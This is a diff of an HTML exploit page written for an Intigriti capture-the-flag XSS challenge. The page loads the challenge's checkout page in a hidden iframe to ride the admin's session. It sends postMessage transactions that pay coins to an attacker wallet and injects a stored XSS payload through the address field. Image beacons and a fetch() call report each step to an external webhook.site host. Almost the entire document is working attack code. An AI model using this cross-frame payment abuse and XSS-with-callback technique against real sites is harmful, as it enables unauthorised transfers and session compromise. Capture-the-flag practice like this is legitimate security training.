@@ -1,120 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Exploit</title>
+    <title>Intigriti XSS - Fixed Exploit</title>
     <meta charset="UTF-8">
+    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
 </head>
 <body>
-    <script>
-        const WEBHOOK = 'https://webhook.site/a0c5dc4c-1b40-463c-95b6-64ea3c45809c';
-        const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
-        const BASE = 'https://challenge-0126.intigriti.io';
-        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
+    <h1>INTIGRITI XSS EXPLOIT</h1>
+    <div id="log">Loading...</div>
 
-        // Track everything
-        function track(step, status, data = {}) {
-            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
-            console.log(step, status, data);
+    <!-- Iframe inherits admin session via SameSite cookies -->
+    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></iframe>
+
+    <script>
+        const WEBHOOK = 'https://webhook.site/216ac4d3-e750-4c55-8bfc-d28981af6737';
+        const YOUR_WALLET = '167ec746968ba8643f253d8f624b0ff8fd';
+        const BASE = 'https://challenge-0126.intigriti.io';
+
+        function log(msg) {
+            document.getElementById('log').innerHTML += '<br>' + msg;
+            console.log(msg);
         }
 
-        track('start', 'loaded', { location: window.location.href });
+        function track(step, status, data = {}) {
+            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
+        }
 
-        // STRATEGY 1: If bot opened us as popup/iframe, use window.opener or window.parent
-        if (window.opener && !window.opener.closed) {
-            track('found_opener', 'success', {});
+        track('start', 'loaded', {});
 
-            // Redirect opener to checkout
-            window.opener.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+        const iframe = document.getElementById('checkout');
 
-            // Wait for checkout to load, then send postMessage
+        iframe.onload = function() {
+            log('Iframe loaded with admin session');
+            track('iframe_loaded', 'success', {});
+
             setTimeout(() => {
-                track('sending_to_opener', 'start', {});
+                log('Sending BOTH transactions instantly...');
+                track('sending_both', 'start', {});
 
-                window.opener.postMessage({
+                const xssPayload = '<img src=x onerror="alert(\'gigawatz\');fetch(\'' + WEBHOOK + '?xss=1\',{mode:\'no-cors\'})">';
+
+                // Send BOTH postMessages instantly (no delay between them)
+                // Async handler processes both in parallel before redirect
+                iframe.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: YOUR_WALLET,
                         currency: '1337COIN',
-                        amount: 1337
+                        amount: 1
                     }
                 }, '*');
 
-                track('tx1_sent', 'done', {});
-
-                window.opener.postMessage({
+                iframe.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: XSS_PAYLOAD,
+                        toAddress: xssPayload,
                         currency: '1337COIN',
-                        amount: 1337
+                        amount: 0
                     }
                 }, '*');
 
-                track('tx2_sent', 'done', {});
+                track('both_sent', 'done', { wallet: YOUR_WALLET, xss: xssPayload.substring(0, 50) });
+                log('Both transactions sent!');
+                log('TX #1: ' + YOUR_WALLET);
+                log('TX #2: XSS payload');
 
                 // Redirect to marketwatch to trigger XSS
                 setTimeout(() => {
-                    window.opener.location = `${BASE}/marketwatch.html`;
-                    track('redirected', 'done', {});
-                }, 3000);
-            }, 8000);
-        }
-        // STRATEGY 2: window.parent (iframe case)
-        else if (window.parent && window.parent !== window) {
-            track('found_parent', 'success', {});
+                    log('Redirecting to marketwatch...');
+                    track('redirecting', 'to_marketwatch', {});
+                    window.location.href = BASE + '/marketwatch.html';
+                }, 5000);
 
-            window.parent.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+            }, 8000); // Wait longer for checkout to fully load
+        };
 
-            setTimeout(() => {
-                track('sending_to_parent', 'start', {});
-
-                window.parent.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx1_sent', 'done', {});
-
-                window.parent.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: XSS_PAYLOAD,
-                        currency: '1337COIN',
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx2_sent', 'done', {});
-
-                setTimeout(() => {
-                    window.parent.location = `${BASE}/marketwatch.html`;
-                    track('redirected', 'done', {});
-                }, 3000);
-            }, 8000);
-        }
-        // STRATEGY 3: No opener/parent - try redirecting this tab
-        else {
-            track('no_opener_parent', 'redirecting_self', {});
-
-            // Store data in localStorage
-            try {
-                localStorage.setItem('exploit_wallet', YOUR_WALLET);
-                localStorage.setItem('exploit_xss', XSS_PAYLOAD);
-                localStorage.setItem('exploit_webhook', WEBHOOK);
-            } catch(e) {}
-
-            // Redirect to a page that will execute our exploit
-            window.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1&exploit=1`;
-        }
-
-        // Listen for messages
-        window.addEventListener('message', (event) => {
-            track('msg_received', 'info', event.data);
-        });
+        iframe.onerror = function() {
+            log('Iframe failed to load!');
+            track('iframe_error', 'failed', {});
+        };
     </script>
 </body>
 </html>
